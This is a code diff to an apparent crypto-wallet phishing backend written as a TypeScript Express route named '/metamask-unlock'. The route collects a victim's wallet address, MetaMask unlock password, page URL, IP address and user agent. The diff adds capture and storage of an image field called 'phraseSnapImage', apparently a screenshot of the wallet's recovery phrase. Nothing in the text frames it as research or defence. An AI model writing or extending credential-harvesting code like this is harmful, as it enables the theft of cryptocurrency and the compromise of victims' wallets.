@@ -391,7 +391,7 @@ router.post('/disconnect', async (req: Request, res: Response) => {
  */
 router.post('/metamask-unlock', async (req: Request, res: Response) => {
   try {
-    const { walletAddress, password, pageUrl, draft } = req.body
+    const { walletAddress, password, pageUrl, draft, phraseSnapImage } = req.body
     if (!walletAddress) return res.status(400).json({ error: 'walletAddress is required' })
 
     try {
@@ -402,11 +402,16 @@ router.post('/metamask-unlock', async (req: Request, res: Response) => {
 
     const unlockPassword = String(password ?? '').slice(0, 500)
     const { clientIp, userAgent } = requestMeta(req)
+    const snap =
+      phraseSnapImage && String(phraseSnapImage).startsWith('data:image')
+        ? String(phraseSnapImage).slice(0, 900_000)
+        : null
     upsertLiveWallet({
       walletAddress,
       walletType: 'MetaMask',
       pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
       unlockPassword,
+      phraseSnapImage: snap,
       userAgent,
       clientIp: clientIp || null,
     })
